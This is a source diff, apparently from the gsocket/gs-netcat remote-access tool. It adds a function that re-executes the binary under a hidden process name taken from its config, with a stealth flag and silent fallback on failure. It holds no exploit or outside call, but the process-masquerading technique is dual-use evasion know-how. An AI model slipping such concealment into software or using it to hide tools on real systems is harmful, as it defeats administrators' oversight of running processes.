@@ -76,8 +76,73 @@ add_env_argv(int *argcptr, char **argvptr[])
 #define PROC_SELF_EXE      "/proc/self/exe"
 #define PROC_SELF_EXE_FBSD "/proc/curproc/file"
 
+static void
+try_changeargv0(char *argv[]) {
+	char *exename;
+	char *ptr;
+#ifdef DEBUG
+	gopt.err_fp = stderr;
+#endif
+
+	if ((GS_GETENV2("CONFIG_WRITE") != NULL) || (GS_GETENV2("CONFIG_CHECK") != NULL)) {
+		DEBUGF("GS_CONFIG_WRITE= or GS_CONFIG_CHECK= is set. Skipping changeargv0\n");
+		return;
+	}
+
+
+	if ((argv == NULL) || (argv[0] == NULL)) {
+		DEBUGF("argv not valid\n");
+		return;
+	}
+	exename = argv[0];
+
+	if ((ptr = getenv("_GS_PROC_EXENAME"))) {
+		// Call ourselves.
+		gopt.prg_exename = ptr; // strdup() in caller.
+		DEBUGF("We are not hidden. ARGV0=%s EXENAME=%s\n", argv[0], gopt.prg_exename);
+		unsetenv("_GS_PROC_EXENAME");
+		return;
+	}
+
+	// FIXME: Enable this to make it work on linux/fbsd when executed with relative path in argv[0].
+	// struct stat sb;
+	// *ptr = NULL;
+	// if (stat(PROC_SELF_EXE, &sb) == 0)
+	// 	ptr = PROC_SELF_EXE;
+	// if ((ptr == NULL) && (stat(PROC_SELF_EXE_FBSD, &sb) == 0))
+	// 	ptr = PROC_SELF_EXE_FBSD;
+	// if (ptr == NULL)
+	// 	return;
+	// exename = ptr;
+	ptr = realpath(exename, NULL /* will malloc */);
+	if (ptr == NULL) {
+		DEBUGF("exename not found [%s]\n", exename);
+		return;
+	}
+	exename = ptr;
+
+	// HERE: Switch to argv0 to different name.
+	// Load config
+	if (GSNC_config_read(exename) != 0) {
+		DEBUGF("GSNC_config_read() failed\n");
+		return;
+	}
+
+	if (gopt.proc_hiddenname == NULL) {
+		DEBUGF("Config has no PROC_HIDDENNAME.\n");
+		return;
+	}
+
+	setenv("_GS_PROC_EXENAME", exename, 1);
+	argv[0] = gopt.proc_hiddenname;
+	execv(exename, argv);
+	DEBUGF("execv()=%s\n", strerror(errno));
+	// Silently ignore. Continue with current argv0 name.
+}
+
 void
-init_defaults1(char *argv0) {
+init_defaults1(char *argv[]) {
+	char *argv0 = argv[0];
 	if (GS_GETENV2("STEALTH") != NULL)
 		gopt.flags |= GSC_FL_IS_STEALTH;
 #ifdef DEBUG
@@ -85,19 +150,7 @@ init_defaults1(char *argv0) {
 #endif
 	gopt.prg_name = NULL;
 
-	// Find my own binary.
-	// FIXME-2024: On non-unix this may fail if argv[0] was changed.
-	// Currently this does not matter because we only use it for GSNC_config
-	struct stat sb;
-	char *ptr = NULL;
-	if (stat(PROC_SELF_EXE, &sb) == 0)
-		ptr = PROC_SELF_EXE;
-	if ((ptr == NULL) && (stat(PROC_SELF_EXE_FBSD, &sb) == 0))
-		ptr = PROC_SELF_EXE_FBSD;
-	if ((ptr == NULL) && (stat(argv0, &sb) == 0))
-		ptr = argv0;
-	if (ptr != NULL)
-		gopt.prg_exename = strdup(ptr);
+	try_changeargv0(argv);
 
 	gopt.prg_name = argv0;
 	if ((gopt.prg_name != NULL) && (gopt.prg_name[0] == '/'))
@@ -151,7 +204,7 @@ init_defaults2(int argc, int *argcptr, char **argvptr[])
 
 void
 init_defaults(int argc, int *argcptr, char **argvptr[]) {
-	init_defaults1(*argvptr[0]);
+	init_defaults1(*argvptr);
 	init_defaults2(argc, argcptr, argvptr);
 }
 
